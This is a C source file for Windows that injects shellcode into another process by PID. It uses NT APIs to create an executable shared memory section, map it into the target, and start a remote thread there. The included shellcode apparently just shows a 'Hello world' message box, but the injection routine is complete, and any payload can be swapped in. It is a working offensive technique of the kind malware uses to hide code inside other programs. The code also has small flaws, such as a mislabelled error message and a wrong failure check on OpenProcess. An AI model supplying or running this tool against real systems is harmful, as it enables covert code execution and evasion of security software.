#include <Windows.h>
#include <stdio.h>
#include "inj.h"

// using NTAPIs
int SectionMappingInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
    HMODULE pNtdllModule = NULL;
    
    // get handle to ntdll module (dll is referred to as module)
    pNtdllModule = GetModuleHandleA("ntdll.dll");
    
    // we will do nt api function resolutions

    // NtCreateSection
    pNtCreateSection myNtCreateSection = (pNtCreateSection)GetProcAddress(pNtdllModule, "NtCreateSection");
    if (myNtCreateSection == NULL) {
        printf("[-] Failed to resolve NtCreateSection\n");
        exit(-1);
    }

    // NtViewMapOfSection
    pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(pNtdllModule, "NtMapViewOfSection");
    if (myNtMapViewOfSection == NULL) {
        printf("[-] Failed to resolve NtCreateSection\n");
        exit(-1);
    }

    // CreateThreadEx
    pNtCreateThreadEx myNtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(pNtdllModule, "NtCreateThreadEx");
    if (myNtCreateThreadEx == NULL) {
        printf("[-] Failed to resolve NtCreateThreadEx\n");
        exit(-1);
    }

    printf("[+] Finished resolving requisitie APIs!\n");

    NTSTATUS status;
    HANDLE hSection;
    HANDLE hTargetProcess;
    HANDLE hThread;
    PVOID local_view_addr = NULL;
    PVOID remote_view_addr = NULL;
    SIZE_T size = 0x1000;
    LARGE_INTEGER section_size = { size };

    // open target process
    hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hTargetProcess == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to get handle to the target process\n");
        exit(-1);
    }

    // create a new section with RWX perms
    status = myNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &section_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed creating section via NtCreateSection API. Error: 0x%x\n", status);
        exit(-1);
    }
    printf("[+] Section created with handle: %d\n", hSection);

    // map view of the section to the local / current process with RW perms.
    status = myNtMapViewOfSection(hSection, GetCurrentProcess(), &local_view_addr, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed mapping view of section to current process via NtMapViewofSection API. Error: 0x%x\n", status);
        exit(-1);
    }
    printf("[+] Section mapped to local process: %p\n", local_view_addr);

    // map view of the section to the remote process with RX perms.
    status = myNtMapViewOfSection(hSection, hTargetProcess, &remote_view_addr, NULL, NULL, NULL, &size, ViewUnmap, NULL, PAGE_EXECUTE_READ);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed mapping view of section to remote process via NtMapViewofSection API. Error: 0x%x\n", status);
        exit(-1);
    }
    printf("[+] Section mapped to remote process: %p\n", remote_view_addr);

    // section copy - copy the payload shellcode to the local_view_addr (local_view_addr has perms of RW so we can copy to it)
    // since section is a shared memory space mapped to the remote process as well, 
    // any content written to the local_view_addr (RW perms), will be visible to remote_view_addr (RX perms).
    memcpy(local_view_addr, payload, payload_size);

    status = myNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hTargetProcess, remote_view_addr, NULL, FALSE, 0, 0, 0 ,NULL);
    if (!NT_SUCCESS(status)) {
        printf("[-] Failed starting threat via NtCreateThreadEx. Error: 0x%x\n", status);
        exit(-1);
    }
    printf("[+] Thread Executed\n");

    return 0;
}

int main(int argc, char **argv) {

    int pid = 0;

    if (argc < 2 || argc > 3) {
        printf("usage: filename.exe <PID>\n");
        exit(-1);
    }

    pid = atoi(argv[1]);

    // MessageBox "hello world"
    unsigned char payload[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
		"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
		"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
		"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
		"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
		"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
		"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
		"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
		"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
		"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
		"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
		"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
		"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
		"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
		"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
		"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
		"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
		"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
		"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
		"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
		"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
		"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
		"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
		"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
		"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
		"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
		"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
		"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
		"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

        SIZE_T payload_size = sizeof(payload);

        SectionMappingInjection(payload, payload_size, pid);
        
        return 0;
}